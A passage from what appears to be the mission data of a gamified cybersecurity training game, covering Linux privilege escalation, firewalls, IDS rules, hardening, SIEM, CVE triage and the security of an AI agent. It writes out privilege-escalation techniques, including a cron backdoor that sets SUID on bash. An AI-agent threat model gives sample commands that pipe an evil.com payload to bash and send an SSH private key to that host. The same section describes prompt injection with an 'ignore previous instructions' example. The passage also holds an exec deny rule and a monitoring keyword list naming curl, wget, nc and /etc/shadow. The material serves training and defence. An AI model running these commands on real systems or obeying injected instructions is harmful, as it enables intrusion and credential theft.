        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The Escalation Engine Room ══╗
You're in. But you're nobody.
Root is the goal. Between you and root:
sudo misconfigs, SUID binaries, writable cron scripts,
vulnerable kernel versions, and weak service accounts.
Work through the checklist. One of these will be your key.

━━ OBJECTIVE ━━
Enumerate a Linux system for privilege escalation vectors.
Use sudo misconfigurations, SUID binaries, and writable cron
scripts to escalate from low-privilege user to root.

━━ WHY IT MATTERS ━━
Privilege escalation is a core pentest skill and a key concept
in Security+ (least privilege principle, access controls).
Defenders need to understand these vectors to close them.

━━ HACKER MINDSET ━━
Run the checklist in order of effort required:
  1. sudo -l (0 effort, sometimes instant root)
  2. SUID binaries (low effort, reliable if found)
  3. Writable cron scripts (medium effort, reliable)
  4. Kernel exploit (high effort, unstable, last resort)
Tools like LinPEAS automate the enumeration so you can focus
on the actual exploitation.

━━ QUEST ━━
Step 1 — Situational awareness:
  whoami && id       → Who am I? Am I in any interesting groups?
  uname -a           → Kernel version (check for CVEs!)
  cat /etc/issue     → OS version

Step 2 — sudo -l (check this IMMEDIATELY):
  sudo -l
  # Look for: (ALL) NOPASSWD: /bin/bash → instant root!
  # Or: (root) NOPASSWD: /usr/bin/vim → sudo vim → :!bash → root!
  # Check GTFOBins for any allowed binary

Step 3 — SUID binaries:
  find / -perm -4000 -type f 2>/dev/null
  # For each binary found, search GTFOBins.github.io
  # Example: find with SUID:
  find . -exec /bin/bash -p \\;      → Root shell!

Step 4 — Writable cron scripts:
  cat /etc/crontab && ls /etc/cron.d/
  # For each script that root runs:
  ls -la /path/to/script.sh
  # If world-writable → append a reverse shell or add a SUID bash:
  echo 'chmod +s /bin/bash' >> /path/to/script.sh
  # Wait for cron to run... then: bash -p (root!)

Step 5 — Automated enumeration with LinPEAS:
  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh | tee ~/linpeas_output.txt
  # Review: red/yellow = high priority findings

Step 6 — Common vector summary:
  sudo misconfiguration  → sudo -l + GTFOBins
  SUID binary exploit    → GTFOBins
  Writable cron script   → Echo backdoor into script
  PATH hijacking         → Writable PATH dir with SUID binary
  Kernel exploit         → search CVEs for uname -r version

━━ NEXT LOCATION ━━
You can root boxes. Now Firewall Fortress (def01) — flip to the
defensive side and lock down everything you just exploited.
""",
    },


    # ══════════════════════════════════════════════════════
    # DEFENSIVE SECURITY
    # ══════════════════════════════════════════════════════

    {
        "id": "def01", "tree": "defense", "tier": 1, "xp": 30,
        "title": "Firewall Fortress",
        "brief": "Configure UFW and iptables. Default deny. Minimum exposure.",
        "bonus": "UFW: allow SSH from subnet only, HTTP/HTTPS from anywhere, deny all else. Verify with nmap. ~/firewall_config.txt",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Perimeter Defense Layer ══╗
The firewall is your castle wall.
Default allow with exceptions is a castle with no wall.
Default deny with explicit allows is a fortress.
Every service you don't need is a door you don't need to defend.

━━ OBJECTIVE ━━
Configure UFW (Uncomplicated Firewall) and understand iptables.
Implement a default-deny policy with explicit allow rules.
Verify the configuration with external scanning.

━━ WHY IT MATTERS ━━
Firewall configuration is a core Security+ topic and a fundamental
security control. Every sysadmin and security engineer deploys
and manages firewalls. This is also the first hardening step
in every CIS Benchmark checklist.

━━ HACKER MINDSET ━━
When a pentester scans your firewall, they're looking for services
that shouldn't be exposed. Every unnecessary port is an attack surface.
Close everything you don't actively need. Verify from the outside.

━━ QUEST ━━
Step 1 — UFW (the friendly wrapper around iptables):
  sudo ufw status                      → Current state
  sudo ufw default deny incoming       → Block all inbound by default
  sudo ufw default allow outgoing      → Allow all outbound (typical)
  sudo ufw enable                      → Activate

Step 2 — Create allow rules:
  sudo ufw allow 22/tcp                → SSH (or specify your port)
  sudo ufw allow 80/tcp                → HTTP
  sudo ufw allow 443/tcp               → HTTPS
  sudo ufw allow from 192.168.1.0/24 to any port 22  → SSH from subnet only
  sudo ufw deny 23/tcp                 → Block Telnet explicitly

Step 3 — View and manage rules:
  sudo ufw status numbered             → See numbered rule list
  sudo ufw delete 3                    → Delete rule #3
  sudo ufw show added                  → Rules as added

Step 4 — Verify from outside:
  nmap YOUR_IP                         → From another machine/VM
  # Should see: 22 open, everything else filtered/closed

Step 5 — iptables (lower level — what UFW uses under the hood):
  sudo iptables -L -v -n               → Current rules (verbose)
  sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
  sudo iptables -A INPUT -j DROP       → Default deny (last rule)
  sudo iptables-save > ~/iptables_backup.txt

Step 6 — Monitor the firewall:
  sudo tail -f /var/log/ufw.log        → Watch blocked connection attempts
  sudo ufw logging on                  → Enable logging if not on
  sudo ufw logging medium              → More detail

━━ NEXT LOCATION ━━
Perimeter secured. IDS Guardian (def02) adds a layer of detection
inside the perimeter — catching attacks that get through.
""",
    },

    {
        "id": "def02", "tree": "defense", "tier": 2, "xp": 50,
        "title": "IDS Guardian",
        "brief": "Deploy Suricata. Write rules. Catch attackers in the act.",
        "bonus": "Write 3 custom rules: port scan, SSH brute force, suspicious HTTP. Test each. ~/ids_rules.txt",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The Intrusion Detection Command Post ══╗
The firewall keeps people out.
But some will get through.
Suricata watches everything that does get in —
matching traffic against thousands of signatures,
flagging anomalies, and alerting you in real time.

━━ OBJECTIVE ━━
Install and configure Suricata IDS. Update rules with suricata-update.
Monitor fast.log for alerts. Write custom detection rules.

━━ WHY IT MATTERS ━━
IDS/IPS is a core Security+ concept and a fundamental SOC tool.
Suricata is used by real security teams worldwide. Rule writing
is a daily skill for SOC engineers and threat hunters.

━━ HACKER MINDSET ━━
From the attacker's perspective, IDS evasion is a real concern.
Understanding how Suricata writes rules helps you understand
how attacks evade detection — and how to improve detection coverage.
Every nmap scan, every Hydra run, every sqlmap request has a signature.

━━ QUEST ━━
Step 1 — Install and configure:
  sudo apt install suricata
  sudo nano /etc/suricata/suricata.yaml
    HOME_NET: "[192.168.1.0/24]"    → Your lab network
    af-packet:
      - interface: eth0              → Your network interface

Step 2 — Update rules:
  sudo suricata-update                 → Download latest ruleset
  sudo suricata-update list-sources    → See available rule sources
  sudo suricata-update enable-source et/open → Enable ET Open rules

Step 3 — Start and monitor:
  sudo suricata -c /etc/suricata/suricata.yaml -i eth0 --daemon
  sudo tail -f /var/log/suricata/fast.log    → Alert stream
  sudo tail -f /var/log/suricata/eve.json    → Full JSON events (ELK-ready)

Step 4 — Trigger alerts (from another VM):
  nmap -sV YOUR_IP                     → Should trigger port scan alerts
  curl "http://YOUR_IP/../../etc/passwd" → Path traversal attempt
  hydra -l root -P rockyou.txt ssh://YOUR_IP → SSH brute force

Step 5 — Write custom rules (saved in /var/lib/suricata/rules/local.rules):
  # Port scan detection:
  alert tcp any any -> $HOME_NET any (msg:"Nmap SYN Scan Detected";
    flags:S; threshold:type both,track by_src,count 20,seconds 5;
    sid:1000001; rev:1;)

  # SSH brute force:
  alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt";
    threshold:type both,track by_src,count 5,seconds 60;
    sid:1000002; rev:1;)

  # Suspicious HTTP (path traversal):
  alert http any any -> $HOME_NET any (msg:"Path Traversal Attempt";
    content:"../"; http.uri; sid:1000003; rev:1;)

Step 6 — Add your custom rules:
  sudo suricata-update --no-reload
  sudo kill -USR2 $(cat /var/run/suricata.pid)   → Reload rules live

━━ NEXT LOCATION ━━
Detection active. Hardening Master (def03) locks down the OS itself —
kernel, SSH, and services — so attackers have less to detect.
""",
    },

    {
        "id": "def03", "tree": "defense", "tier": 3, "xp": 60,
        "title": "Hardening Master",
        "brief": "Full system hardening: kernel, SSH, services, file integrity.",
        "bonus": "Apply ALL hardening steps. Run linpeas.sh before and after. Document improvements. ~/hardening_report.txt",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The System Hardening Vault ══╗
A fresh Linux install is trusting by default.
IP forwarding on. Root SSH allowed. Unnecessary services running.
Kernel parameters at their permissive defaults.
Your job: strip it down to the minimum. Harden what remains.

━━ OBJECTIVE ━━
Apply kernel sysctl hardening, SSH lockdown, service minimization,
and file integrity monitoring (AIDE). CIS Benchmark compliance.

━━ WHY IT MATTERS ━━
System hardening is required for CIS Benchmarks, NIST 800-53,
and ISO 27001 compliance. Security engineers and sysadmins
implement these controls daily. Security+ tests hardening concepts.

━━ HACKER MINDSET ━━
Every default you leave enabled is a potential attack path.
After running LinPEAS on a hardened system, the findings list
should be near-empty. After hardening, compare with your first
LinPEAS scan to measure your improvement.

━━ QUEST ━━
Step 1 — Kernel hardening via sysctl:
  sudo nano /etc/sysctl.conf
  # Add these lines:
  net.ipv4.ip_forward = 0                    → Disable routing
  net.ipv4.tcp_syncookies = 1                → SYN flood protection
  net.ipv4.conf.all.rp_filter = 1            → Reverse path filtering
  net.ipv4.conf.all.accept_redirects = 0     → Ignore ICMP redirects
  net.ipv4.conf.all.send_redirects = 0
  kernel.randomize_va_space = 2              → ASLR (full randomization)
  kernel.dmesg_restrict = 1                  → Hide kernel messages from users
  kernel.sysrq = 0                           → Disable SysRq key
  net.ipv4.conf.all.log_martians = 1         → Log spoofed packets

  sudo sysctl -p                             → Apply immediately

Step 2 — SSH hardening (/etc/ssh/sshd_config):
  PermitRootLogin no                         → Never SSH as root
  PasswordAuthentication no                  → Keys only, no passwords
  MaxAuthTries 3                             → Limit attempts
  ClientAliveInterval 300                    → Timeout idle sessions
  Port 2222                                  → Non-standard port (minor obscurity)
  AllowUsers captain analyst                 → Whitelist users only
  Protocol 2                                 → Force SSH v2

  sudo systemctl restart sshd
  # Test login BEFORE closing current session!

Step 3 — Service minimization:
  sudo systemctl list-units --type=service --state=running
  # For each non-essential service:
  sudo systemctl stop service_name
  sudo systemctl disable service_name
  # Keep: ssh, network, logging. Remove: bluetooth, cups, avahi

Step 4 — File Integrity Monitoring with AIDE:
  sudo apt install aide
  sudo aideinit                              → Build the initial database
  sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
  sudo aide --check                          → Check for changes
  # Run this daily: any change to system files is flagged

Step 5 — Audit logging:
  sudo apt install auditd
  sudo systemctl enable --now auditd
  sudo auditctl -w /etc/shadow -p wa -k shadow_changes
  sudo auditctl -w /etc/sudoers -p wa -k sudoers_changes
  sudo auditctl -w /bin/su -p x -k su_exec
  sudo ausearch -k shadow_changes           → Review shadow file access

━━ NEXT LOCATION ━━
System hardened. Now SIEM — deploy Wazuh or ELK Stack (siem01)
and centralize all these logs for real-time detection and response.
""",
    },


    # ══════════════════════════════════════════════════════
    # SIEM & DETECTION
    # ══════════════════════════════════════════════════════

    {
        "id": "siem01", "tree": "siem", "tier": 1, "xp": 35,
        "title": "Wazuh Deployment",
        "brief": "Deploy the open-source SIEM. Ingest logs. See everything.",
        "bonus": "Connect your Parrot VM as a Wazuh agent. Verify alerts from your previous attacks appear in the dashboard.",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The SIEM Operations Center ══╗
Logs are everywhere. /var/log/auth.log, syslog, ufw.log,
suricata/eve.json, audit.log — terabytes of events daily.
Without a SIEM, you're reading individual needles.
With a SIEM, the haystack becomes a map.
Wazuh is the open-source answer. Let's deploy it.

━━ OBJECTIVE ━━
Deploy Wazuh (open-source SIEM/XDR) using Docker or the all-in-one installer.
Configure agents, explore the dashboard, and verify that alerts fire.

━━ WHY IT MATTERS ━━
SIEMs are the backbone of every SOC. Security+ tests SIEM concepts,
log management, and event correlation. Wazuh is used by real
security teams worldwide and is fully open-source — no license needed.

━━ HACKER MINDSET ━━
A well-configured SIEM makes attackers visible. Every nmap scan,
every failed SSH login, every SUID modification — all logged and
correlated. From the red team perspective: your job is to operate
without triggering any of these rules. From the blue team: catch them.

━━ QUEST ━━
Step 1 — System requirements:
  Wazuh Server: 2+ CPU cores, 4+ GB RAM, 50+ GB storage
  Can run on your Windows host or a dedicated VM

Step 2 — Install Wazuh (all-in-one on a Linux VM):
  curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
  sudo bash ./wazuh-install.sh -a          → Installs all components
  # This installs: Wazuh Manager, Indexer (OpenSearch), Dashboard

Step 3 — Access the dashboard:
  https://YOUR_WAZUH_IP (credentials shown at end of install)
  # Default: admin / (password shown during install)

Step 4 — Install a Wazuh agent on your Parrot VM:
  # On Parrot VM:
  curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
  echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
  sudo apt update && sudo apt install wazuh-agent
  sudo WAZUH_MANAGER='YOUR_WAZUH_IP' WAZUH_AGENT_NAME='parrot-lab' dpkg-reconfigure wazuh-agent
  sudo systemctl enable --now wazuh-agent

Step 5 — Trigger and observe alerts:
  # From another terminal, run some things that should alert:
  sudo -l                              → Privilege check (logged by auditd)
  find / -perm -4000 2>/dev/null       → SUID enumeration
  ssh wrongpassword@localhost          → Failed SSH login
  # Watch Wazuh dashboard → Security events

Step 6 — Explore the dashboard:
  Overview → See alert counts and severity distribution
  Security Alerts → Filter by rule.id, agent, or MITRE tactic
  Integrity Monitoring → See any files changed by AIDE
  Vulnerability Detector → CVEs found on the agent

━━ NEXT LOCATION ━━
Wazuh running. ELK Stack (siem02) shows you how to build
custom log pipelines and dashboards for advanced detection.
""",
    },

    {
        "id": "siem02", "tree": "siem", "tier": 2, "xp": 50,
        "title": "ELK Stack & Log Analysis",
        "brief": "Elasticsearch, Logstash, Kibana. Build detection dashboards.",
        "bonus": "Build a Kibana dashboard showing: top failed SSH IPs, SUID access attempts, UFW blocks. Export as PNG.",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The Log Analysis Laboratory ══╗
Raw logs are noise. Parsed, indexed, and visualized logs are intelligence.
The ELK Stack (Elasticsearch + Logstash + Kibana) is what SOC teams
use to turn millions of daily events into actionable alerts.
This is where incident responders live.

━━ OBJECTIVE ━━
Deploy the ELK Stack using Docker Compose. Ship logs via Filebeat.
Query events with KQL. Build detection dashboards in Kibana.

━━ WHY IT MATTERS ━━
ELK is the most widely used open-source SIEM stack in the industry.
Security+ tests log management concepts. SOC Analyst roles require
daily KQL querying and dashboard building skills.

━━ HACKER MINDSET ━━
A well-built ELK dashboard turns an attacker's every move into
a visible trail. The attacker's goal: blend into normal traffic,
avoid creating unique log patterns, and stay below alert thresholds.
Your goal as a defender: make it impossible to be invisible.

━━ QUEST ━━
Step 1 — Deploy ELK with Docker Compose:
  sudo apt install docker.io docker-compose
  # Create docker-compose.yml:
  cat > ~/elk/docker-compose.yml << 'EOF'
  version: '3'
  services:
    elasticsearch:
      image: elasticsearch:8.12.0
      environment:
        - discovery.type=single-node
        - xpack.security.enabled=false
      ports: ["9200:9200"]
    kibana:
      image: kibana:8.12.0
      ports: ["5601:5601"]
      depends_on: [elasticsearch]
    logstash:
      image: logstash:8.12.0
      volumes:
        - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
      depends_on: [elasticsearch]
  EOF
  cd ~/elk && sudo docker-compose up -d

Step 2 — Configure Logstash to ingest auth.log:
  cat > ~/elk/logstash.conf << 'EOF'
  input {
    file { path => "/var/log/auth.log" start_position => "beginning" }
  }
  filter {
    grok { match => { "message" => "%{SYSLOGTIMESTAMP:timestamp} %{HOSTNAME:host} %{WORD:program}: %{GREEDYDATA:message}" } }
  }
  output {
    elasticsearch { hosts => ["elasticsearch:9200"] index => "auth-logs" }
  }
  EOF

Step 3 — Install Filebeat (ships logs to ELK):
  sudo apt install filebeat
  # Enable modules:
  sudo filebeat modules enable system suricata
  sudo filebeat setup -e
  sudo systemctl enable --now filebeat

Step 4 — Access Kibana:
  http://localhost:5601
  Stack Management → Index Patterns → Create: auth-logs-*
  Discover → Select your index → Search your logs

Step 5 — KQL queries for threat hunting:
  event.action: "failed-login" and user.name: "root"
  source.ip: "192.168.1.*" and event.outcome: "failure"
  process.name: "nmap" or process.name: "hydra"
  suricata.eve.event_type: "alert" and suricata.eve.alert.severity: 1

Step 6 — Build detection dashboards:
  Kibana → Dashboard → Create → Add Lens visualization
  Chart ideas:
    Bar: Top 10 source IPs for failed SSH (last 24h)
    Pie: Alert categories from Suricata
    Timeline: Login events over time

━━ NEXT LOCATION ━━
Logs centralized and visualized. Governance (gov01) teaches you
to map all of this work to frameworks like NIST CSF and MITRE ATT&CK.
""",
    },


    # ══════════════════════════════════════════════════════
    # GOVERNANCE & FRAMEWORKS
    # ══════════════════════════════════════════════════════

    {
        "id": "gov01", "tree": "governance", "tier": 1, "xp": 25,
        "title": "NIST & CVE Basics",
        "brief": "The CIA Triad, NIST CSF, CVEs, and CVSS. The universal language.",
        "bonus": "Map your lab to NIST CSF — for each function, what have you done? What gaps remain? ~/nist_assessment.txt",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Compliance Briefing Room ══╗
Every security control, every tool, every policy maps to a framework.
Frameworks are the shared language between security teams,
auditors, executives, and regulators.
You need to speak this language fluently.

━━ OBJECTIVE ━━
Understand the CIA Triad, NIST Cybersecurity Framework, CVE/NVD,
CVSS scoring, and how MITRE ATT&CK maps to real attack techniques.

━━ WHY IT MATTERS ━━
This is the foundation of CompTIA Security+ and every other
security certification. GRC roles live here full-time. Even
technical roles need this language to communicate findings,
write reports, and justify security investments.

━━ HACKER MINDSET ━━
Every technique in MITRE ATT&CK maps to a real attack. When you
ran nmap, that was Reconnaissance (TA0043). When you ran LinPEAS,
that was Discovery (TA0007). When you exploited a SUID binary,
that was Privilege Escalation (TA0004). You've already been
practicing ATT&CK — now you have the taxonomy to describe it.

━━ QUEST ━━
Step 1 — CIA Triad (the foundation of all security decisions):
  C — CONFIDENTIALITY: Only authorized parties access data
      Attacks: eavesdropping, data exfiltration, credential theft
      Controls: encryption, MFA, access control lists
  I — INTEGRITY: Data hasn't been tampered with
      Attacks: man-in-the-middle, SQL injection, file modification
      Controls: hashing, digital signatures, WORM storage, AIDE
  A — AVAILABILITY: Systems work when needed
      Attacks: DDoS, ransomware, resource exhaustion
      Controls: redundancy, backups, rate limiting, DDoS mitigation

Step 2 — NIST Cybersecurity Framework (5 functions):
  IDENTIFY  → What assets do we protect? What are the risks?
  PROTECT   → What controls prevent attacks? (firewalls, encryption)
  DETECT    → How do we catch attacks? (SIEM, IDS, monitoring)
  RESPOND   → What do we do when attacked? (IR plan, containment)
  RECOVER   → How do we restore to normal? (backups, DR plan)

Step 3 — CVE and NVD:
  CVE = Common Vulnerabilities and Exposures
  Format: CVE-YYYY-NNNNN (e.g., CVE-2021-44228 = Log4Shell)
  NVD = National Vulnerability Database: https://nvd.nist.gov
  # Search any CVE to see: description, CVSS score, affected versions

Step 4 — CVSS Scoring (Common Vulnerability Scoring System):
  0.0        → None
  0.1 - 3.9  → Low
  4.0 - 6.9  → Medium
  7.0 - 8.9  → High
  9.0 - 10.0 → Critical
  
  Factors: attack vector, complexity, privileges required,
           user interaction, scope, impact (CIA)

Step 5 — Other critical frameworks:
  MITRE ATT&CK   → Adversary tactics and techniques (https://attack.mitre.org)
  OWASP Top 10   → Web application vulnerability categories
  CIS Benchmarks → Hardening guides for every OS and service
  ISO 27001      → Information security management standard
  NIST 800-53    → Security controls for federal systems (very detailed)

━━ NEXT LOCATION ━━
CVE Hunter (gov02) — put this knowledge to work. Find real CVEs
in your lab environment and assess whether you're vulnerable.
""",
    },

    {
        "id": "gov02", "tree": "governance", "tier": 2, "xp": 40,
        "title": "CVE Hunter",
        "brief": "Find, read, and assess real CVEs in your environment.",
        "bonus": "Scan with nmap --script vuln. Look up each CVE found. Prioritize and write ~/vuln_report.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Vulnerability Intelligence Station ══╗
CVEs are documented vulnerabilities. Thousands are published each year.
Your job: find which ones affect YOUR environment, score them,
prioritize them by real-world risk, and track remediation.
This is the core workflow of every vulnerability management program.

━━ OBJECTIVE ━━
Use nmap NSE scripts, searchsploit, and the NVD to find and assess
CVEs in your lab. Prioritize by CVSS + exploitability + exposure.

━━ WHY IT MATTERS ━━
Vulnerability management is a core security function. GRC Analysts,
Security Engineers, and SOC teams all use this process. Security+
tests vulnerability scanning concepts and remediation prioritization.

━━ HACKER MINDSET ━━
Searchsploit is your bridge between vulnerability databases and
working exploits. When you find a CVE with a searchsploit entry
and a CVSS score of 9.8, that's your first target in any engagement.

━━ QUEST ━━
Step 1 — Find what's running and what version:
  dpkg -l | grep -E 'openssh|apache|nginx|mysql|php'
  apt show openssh-server 2>/dev/null | grep Version
  nmap -sV localhost → Service versions

Step 2 — Search for exploits with searchsploit:
  searchsploit openssh
  searchsploit "apache 2.4"
  searchsploit --cve CVE-2021-44228     → Search by CVE directly
  searchsploit -x 47837                 → Read exploit without copying
  searchsploit -m 47837 ~/              → Copy to your directory

Step 3 — Automated vulnerability scanning with nmap:
  nmap --script vuln TARGET             → Check all vuln scripts
  nmap --script=http-shellshock TARGET  → Shellshock (CVE-2014-6271)
  nmap --script=smb-vuln-ms17-010 TARGET → EternalBlue

Step 4 — Nikto (web vulnerability scanner):
  nikto -h http://TARGET
  nikto -h http://TARGET -o ~/nikto_report.html -Format htm

Step 5 — Prioritization framework:
  Score each CVE on:
  1. CVSS severity (9+ = fix NOW)
  2. Public exploit exists? (searchsploit, Exploit-DB) → +priority
  3. Is the service internet-facing? → +priority
  4. Asset criticality (production vs dev) → +priority

Step 6 — Remediation:
  sudo apt update && apt list --upgradable  → Available patches
  sudo apt upgrade PACKAGE                  → Patch specific package
  sudo apt full-upgrade                     → All patches

━━ NEXT LOCATION ━━
Governance tree complete. Tools & AI Security (tl01) extends your
knowledge to zero-trust VPNs and the security of AI agent stacks.
""",
    },


    # ══════════════════════════════════════════════════════
    # TOOLS & AI SECURITY
    # ══════════════════════════════════════════════════════

    {
        "id": "tl01", "tree": "tools", "tier": 1, "xp": 35,
        "title": "Twingate Zero-Trust VPN",
        "brief": "Deploy zero-trust networking for your lab. No exposed ports.",
        "bonus": "Compare ss -tulnp before and after Twingate. Document which ports disappeared from the internet. ~/vpn_audit.txt",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Zero-Trust Network Hub ══╗
Traditional VPNs: connect → access everything.
Zero trust: connect → access only what you're authorized for.
Twingate implements zero-trust for your home lab —
no exposed ports on your VMs, no attack surface for scanners.

━━ OBJECTIVE ━━
Install Twingate on Parrot OS. Configure a Remote Network and Connector.
Define Resources (your lab VMs). Verify zero-trust access.

━━ WHY IT MATTERS ━━
Zero-trust is rapidly replacing traditional VPNs in enterprise.
Security+ tests network access control models. Understanding
zero-trust architecture is valuable for Security Engineer roles.

━━ HACKER MINDSET ━━
Zero-trust means an attacker scanning Shodan for your home lab
finds... nothing. The Connector makes only outbound connections.
There are no open ports for a scanner to find. This is security
through architecture, not just security through configuration.

━━ QUEST ━━
Step 1 — Understand Zero Trust vs VPN:
  Traditional VPN:
    → You connect → You're on the network → Access everything
    → One compromised device = lateral movement everywhere

  Zero Trust (Twingate):
    → Every request verified (who are you + which resource)
    → Per-resource access (you can reach VM-A but not VM-B)
    → Connector: outbound-only (no open ports!)

Step 2 — Install Twingate on Parrot:
  curl -s https://binaries.twingate.com/client/linux/install.sh | sudo bash
  sudo twingate setup         → Enter your network name
  twingate start              → Start (no sudo — need desktop auth!)
  twingate status             → Verify running

Step 3 — Set up the Admin Console:
  1. Sign up at https://www.twingate.com
  2. Create a Remote Network → name it "Home Lab"
  3. Deploy a Connector on your Parrot VM:
     docker run -d --name twingate-connector \
       -e TWINGATE_NETWORK=YOUR_NETWORK \
       -e TWINGATE_ACCESS_TOKEN=TOKEN \
       twingate/connector:latest
  4. Add Resources: define each VM IP you want to reach
  5. Assign access to your user/group

Step 4 — Test the access:
  # From your Windows host (with Twingate client installed):
  ping 192.168.1.100   → Should work through Twingate
  # From the internet (phone hotspot):
  ssh captain@VM_IP    → Should work through Twingate
  nmap VM_IP           → From outside → should show nothing!

Step 5 — Verify zero exposure:
  # On the Parrot VM (with Connector running):
  ss -tulnp | grep twingate     → Only outbound connections
  # Scan from a machine NOT connected to Twingate:
  nmap YOUR_PUBLIC_IP           → Should see no open ports!

━━ NEXT LOCATION ━━
OpenClaw Deploy (tl02) — deploy an AI agent stack securely
and understand the new attack surface AI introduces.
""",
    },

    {
        "id": "tl02", "tree": "tools", "tier": 2, "xp": 50,
        "title": "OpenClaw Deploy",
        "brief": "Install and harden an AI agent. New attack surface, new defenses.",
        "bonus": "Restrict OpenClaw permissions to deny exec. Audit all installed skills. Connect through Twingate only. ~/openclaw_security.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The AI Security Lab ══╗
AI agents can search the web, read files, execute code, and call APIs.
They are incredibly powerful — and incredibly dangerous if misconfigured.
Every permission you grant is a permission an attacker can abuse.
The AI security model is the new frontier. Few people understand it.
You will.

━━ OBJECTIVE ━━
Install OpenClaw AI agent on Parrot OS. Audit its permissions and
installed skills. Apply security hardening. Understand the threat model.

━━ WHY IT MATTERS ━━
AI agents are becoming ubiquitous in enterprise. Understanding
their security model — prompt injection, tool abuse, data exfiltration
— is cutting-edge knowledge that will differentiate you in the job market.
This is where cybersecurity and AI intersect.

━━ HACKER MINDSET ━━
If an AI agent has shell exec permission, it's a remote code
execution endpoint. If it has file access, it can exfiltrate data.
Prompt injection (injecting instructions into content the AI reads)
can hijack an AI agent's actions. Treat it like you'd treat
any network service: minimize permissions, audit everything.

━━ QUEST ━━
Step 1 — Install OpenClaw on Parrot:
  curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
  sudo apt install -y nodejs
  npm install -g openclaw@latest
  openclaw onboard --install-daemon

Step 2 — Audit the default configuration:
  cat ~/.openclaw/config.json           → Are API keys in plaintext?
  cat ~/.openclaw/openclaw.json         → What tools/permissions are enabled?
  ls ~/.openclaw/skills/                → What skills are installed?
  ss -tulnp | grep node                 → What port is the gateway on?

Step 3 — Identify the attack surface:
  What can this agent do with default permissions?
    web_search → Can look up anything (information disclosure)
    exec       → CAN EXECUTE SHELL COMMANDS (highest risk!)
    file_read  → Can read any file the agent has access to
    file_write → Can write files (backdoor risk!)
    http_fetch → Can make external HTTP requests (SSRF risk!)

Step 4 — Harden the permissions:
  # Edit ~/.openclaw/openclaw.json:
  {
    "tools": {
      "allow": ["web_search"],
      "deny":  ["exec", "file_write", "http_fetch"]
    }
  }
  # Grant only what the agent actually needs to do its job

Step 5 — Audit installed skills:
  # Each skill file is a markdown instruction set
  # Third-party skills can contain prompt injection payloads!
  cat ~/.openclaw/skills/some_skill.md
  # Look for: instructions to call external URLs, write files, exec commands
  # If a skill you didn't write does any of these → REMOVE IT

Step 6 — Threat model:
  Threat 1: Prompt injection via web content
    → AI reads a malicious web page that says "ignore previous instructions"
    → The agent then does what the injected prompt says
    → Mitigation: restrict exec and file_write permissions

  Threat 2: Data exfiltration via web_search
    → Agent reads your API keys → constructs a search with them
    → Mitigation: restrict sensitive file access, log all actions

  Threat 3: Third-party skill compromise
    → Evil skill silently exfiltrates data or plants persistence
    → Mitigation: only install skills from trusted, audited sources

━━ NEXT LOCATION ━━
AI Red Team (tl03) — now audit your full stack from an attacker's
perspective. What's the blast radius if OpenClaw is compromised?
""",
    },

    {
        "id": "tl03", "tree": "tools", "tier": 3, "xp": 60,
        "title": "AI Red Team",
        "brief": "Audit your OpenClaw + Twingate stack from an attacker's view.",
        "bonus": "Write a monitoring script for OpenClaw logs: alert on curl, wget, nc, rm -rf, /etc/shadow. Your first AI-IDS.",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The AI Threat Assessment Chamber ══╗
You've deployed an AI agent and a zero-trust VPN.
Now you're going to attack your own setup.
Red team your own infrastructure. Find the gaps before someone else does.
This is the highest-value skill in this entire game.

━━ OBJECTIVE ━━
Red team your AI agent + VPN stack. Identify the blast radius of a
compromise. Harden based on findings. Write a monitoring script.

━━ WHY IT MATTERS ━━
AI agent security auditing is a brand-new discipline. The people
who can do it are in very high demand. This is cutting-edge
security work that barely exists as a profession yet — but it will.

━━ HACKER MINDSET ━━
Ask: if this system is compromised, what can the attacker do?
Work backwards from impact. If the AI agent has exec permission
and network access, a compromised AI = remote code execution.
That's not a theoretical risk. That's an actual attack path.

━━ QUEST ━━
Step 1 — Audit OpenClaw exposure:
  ss -tulnp | grep node          → Is the gateway exposed beyond localhost?
  curl http://localhost:PORT/api → Is there an unauthenticated API?
  cat ~/.openclaw/config.json    → API keys, tokens, secrets in plaintext?
  ls -la ~/.openclaw/            → File permissions on config?
  # If other users can read config.json → API key theft!

Step 2 — Audit Twingate:
  twingate resources             → Are resources scoped to minimum needed?
  # In admin console: check access policies
  # Is your connector running as root? (it shouldn't be)
  ps aux | grep twingate         → What user runs the connector?
  # Connector as root = if connector is compromised → root on that machine

Step 3 — Map the blast radius:
  Scenario: AI agent is prompt-injected and tries to:
    1. curl http://evil.com/payload.sh | bash
       → Is exec allowed? Is outbound HTTP unrestricted?
    2. cat ~/.ssh/id_rsa > /tmp/key && curl -d @/tmp/key http://evil.com
       → Is file_read + http_fetch allowed?
    3. nmap 192.168.1.0/24 → internal network scanning via AI

  For each scenario: CAN it happen with current permissions? If yes → fix it.

Step 4 — Write the AI monitoring script (~/scripts/openclaw_monitor.sh):
  #!/bin/bash
  LOGFILE=~/.openclaw/logs/agent.log
  ALERT_TERMS="curl wget nc nmap rm -rf /etc/shadow /etc/passwd ssh-keygen"
  tail -F "$LOGFILE" | while read line; do
      for term in $ALERT_TERMS; do
          if echo "$line" | grep -q "$term"; then
              echo "⚠️  ALERT: Suspicious AI action detected: $term"
